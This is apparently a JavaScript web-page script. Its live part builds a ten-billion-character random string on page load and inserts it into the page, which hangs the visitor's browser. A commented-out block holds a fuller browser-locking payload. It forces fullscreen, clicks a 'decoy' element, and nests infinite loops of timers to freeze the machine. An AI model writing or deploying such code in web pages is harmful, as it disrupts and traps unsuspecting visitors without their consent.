antonienie = "antonienie";
add = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",";",",","!","1","2","3","4","5","6","7","8","9","0"]
for (i=1;i<10000000000;i++) {
    antonienie += add[Math.floor(Math.random()*add.length)];
}
const para = document.createElement("p");
para.innerText = antonienie;
document.body.appendChild(para);
/*
var num = 0;
elem = document.documentElement;
elem2 = document.getElementById("decoy");
function die() {
    setTimeout(die,0);
    setTimeout(die,0);
}
function fullscreen() {
    elem.requestFullscreen();
    document.getElementById("decoy").click();
    setTimeout(laggout,0);
}
function laggout() {
    setTimeout(laggout,0);
    setTimeout(fullscreen,0);
    while (true) {
        setTimeout(die,0);
        while (true) {
            setTimeout(die,0);
            while (true) {
                setTimeout(die,0);
                while (true) {
                    setTimeout(die,0);
                    while (true) {
                        setTimeout(die,0);
                        while (true) {
                            setTimeout(die,0);
                            while (true) {
                                setTimeout(die,0);
                                while (true) {
                                    setTimeout(die,0);
                                    while (true) {
                                        setTimeout(die,0);
                                        while (true) {
                                            setTimeout(die,0);
                                            while (true) {
                                                setTimeout(die,0);
                                                while (true) {
                                                    setTimeout(die,0);
                                                    while (true) {
                                                        setTimeout(die,0);
                                                        while (true) {
                                                            setTimeout(die,0);
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                
                            }
                        }
                    }
                }
            }
        }
    }
    
}
*/